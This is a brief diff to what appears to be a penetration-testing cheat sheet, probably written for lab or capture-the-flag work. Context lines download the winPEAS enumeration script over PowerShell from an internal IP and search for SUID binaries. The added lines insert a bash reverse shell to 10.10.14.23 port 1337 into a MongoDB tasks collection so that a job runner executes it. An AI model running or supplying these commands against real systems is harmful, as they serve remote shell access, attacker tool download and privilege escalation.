@@ -24,5 +24,11 @@ sudo -l
 powershell Invoke-WebRequest -Uri http://10.8.102.117:80/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'
 
 
+check processes
+ps auxww
+
+for mongodb
+> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.23/1337 0>&1'"})
+
 
 find / -perm +6000 2>/dev/null | grep '/bin/'
